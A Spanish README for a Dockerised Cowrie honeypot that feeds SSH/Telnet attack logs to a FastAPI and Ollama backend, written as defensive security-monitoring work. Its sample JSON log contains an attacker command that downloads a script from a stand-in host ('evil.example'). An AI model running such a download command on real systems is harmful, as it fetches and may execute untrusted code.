# 🪤 Valhalla SOC — Honeypot (Cowrie)

Honeypot **SSH/Telnet** independiente basado en [Cowrie](https://github.com/cowrie/cowrie). Simula un servidor Ubuntu real, captura cualquier intento de acceso y **exporta todos los eventos a JSON** para que el backend (FastAPI + Ollama) los consuma.

Este subproyecto es **totalmente autocontenido**: tiene su propio `docker-compose.yml`, su propia configuración y sus propios scripts. Puedes arrancarlo sin levantar el resto del SOC.

## 📚 Documentación

| Documento | Qué contiene |
|---|---|
| [**docs/MANUAL.md**](docs/MANUAL.md) | Manual completo de operación (requisitos, instalación, configuración, operación diaria, troubleshooting, integración con backend). |
| [**docs/VERIFICACION.md**](docs/VERIFICACION.md) | Procedimiento formal de verificación con 15 tests. Rellenable como entregable. |
| [**docs/CHANGELOG.md**](docs/CHANGELOG.md) | Qué cambios se han hecho en el repo, por qué, y qué no se ha tocado. |

---

## 📐 Arquitectura

```
                     Internet / LAN
                            │
                       :2222 (SSH)   :2223 (Telnet)
                            │
                 ┌──────────▼──────────┐
                 │    valhalla-cowrie  │  ← contenedor único
                 │     (cowrie:latest) │
                 └──────────┬──────────┘
                            │
           ┌────────────────┼────────────────┐
           │                │                │
     cowrie.json       cowrie.log      downloads/*
     (eventos JSON)    (texto humano)  (payloads capturados)
           │
           ▼
   Volumen nombrado  `valhalla_cowrie_logs`
           │
           ▼
   Backend FastAPI  (tail -F → parse → Ollama → API)
```

El backend se une a la red `valhalla-net` (declarada `external: true` en su propio compose) y monta el mismo volumen `valhalla_cowrie_logs` en modo lectura.

---

## 🚀 Arranque rápido

```bash
cd honeypot
cp .env.example .env          # opcional, valores por defecto son usables
make up                       # equivale a: docker compose up -d
make status                   # verificar que está arriba y healthy
make logs                     # tail en vivo con formato TSV (requiere jq)
```

Y para probarlo desde otra terminal:

```bash
ssh -p 2222 root@localhost    # contraseña cualquiera de las del userdb (ej. 123456)
```

Verás una shell falsa: todo lo que escribas se registra en `./logs/cowrie.json`.

---

## 📂 Estructura

```
honeypot/
├── docker-compose.yml        # Stack standalone (solo Cowrie)
├── Makefile                  # Atajos: up / down / logs / status / test
├── .env.example              # Variables (puertos, nombres)
├── .gitignore
├── cowrie/
│   ├── cowrie.cfg            # Config del honeypot (JSON output ON)
│   └── userdb.txt            # Credenciales "permitidas" (bait)
├── logs/                     # cowrie.json + cowrie.log (gitignored)
├── downloads/                # payloads capturados (gitignored)
├── tty/                      # sesiones TTY grabadas (gitignored)
└── scripts/
    ├── start.sh
    ├── stop.sh
    ├── status.sh
    ├── tail-logs.sh
    └── test-attack.sh        # simula fuerza bruta contra el honeypot
```

---

## 🔧 Configuración

### Puertos

Por defecto Cowrie escucha en `2222` (SSH) y `2223` (Telnet) para no requerir privilegios. Si quieres recibir tráfico real de internet en el puerto 22, cambia `COWRIE_SSH_PORT` en `.env` o redirige con iptables:

```bash
# Redirigir el 22 externo al 2222 del honeypot
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

### Credenciales señuelo

Edita `cowrie/userdb.txt`. Formato:

```
usuario:x:contraseña          # permite
usuario:x:!contraseña         # deniega
*:x:*                         # wildcard (al final)
```

Tras cambiar el archivo: `make restart`.

### Banner / hostname

`cowrie/cowrie.cfg` → `[honeypot] hostname = production-server`. Reinicia para aplicar.

---

## 📝 Formato de los logs JSON

Cada línea de `logs/cowrie.json` es un objeto JSON. Eventos clave que el backend filtra:

| eventid | Descripción | Campos útiles |
|---|---|---|
| `cowrie.session.connect` | Conexión entrante | `src_ip`, `src_port`, `session` |
| `cowrie.login.failed` | Login fallido | `username`, `password`, `src_ip` |
| `cowrie.login.success` | Login aceptado (cayó en la trampa) | `username`, `password`, `src_ip` |
| `cowrie.command.input` | Comando ejecutado en la shell falsa | `input`, `src_ip`, `session` |
| `cowrie.session.file_download` | El atacante sube/baja un fichero | `url`, `outfile`, `shasum` |
| `cowrie.session.closed` | Fin de sesión | `duration` |

Ejemplo real:

```json
{"eventid":"cowrie.login.success","username":"root","password":"123456","src_ip":"185.x.x.x","timestamp":"2026-04-19T19:45:03.122Z","session":"abc123"}
{"eventid":"cowrie.command.input","input":"wget http://evil.example/x.sh","src_ip":"185.x.x.x","timestamp":"2026-04-19T19:45:07.991Z","session":"abc123"}
```

El backend FastAPI hace `tail -F cowrie.json`, parsea cada línea y decide qué enviar a Ollama para análisis.

---

## 🧪 Probar el honeypot

```bash
make test     # lanza intentos con credenciales típicas
make logs     # observa los eventos llegando en tiempo real
```

O manualmente:

```bash
ssh -p 2222 root@localhost
# password: 123456
# ya estás dentro de la shell falsa — prueba: uname -a, ls, wget http://...
```

---

## 🔌 Cómo lo consume el Backend

El backend (`../backend/`) hará algo como:

```python
# backend: tail del log y envío a Ollama
async for line in tail_follow(Path("/var/log/cowrie/cowrie.json")):
    event = json.loads(line)
    if event["eventid"] in {"cowrie.command.input", "cowrie.login.success"}:
        analysis = await ollama.analyze(event)
        await api.push(event, analysis)
```

El volumen compartido `valhalla_cowrie_logs` es lo que hace que esto funcione entre contenedores independientes.

---

## 🧹 Mantenimiento

```bash
make status           # health + conteo de eventos
make restart          # reinicia preservando logs
make rebuild          # baja, borra volúmenes, vuelve a levantar
make clean            # borra los logs locales (./logs, ./downloads)
```

Para inspeccionar un payload capturado:

```bash
ls -la downloads/
file downloads/<hash>
```

> ⚠️ Los ficheros en `downloads/` pueden ser **malware real**. No los ejecutes.

---

## 📚 Referencias

- [Cowrie — documentación oficial](https://cowrie.readthedocs.io/)
- [Imagen Docker oficial](https://hub.docker.com/r/cowrie/cowrie)
- Valhalla SOC — [README del proyecto completo](../README.md)
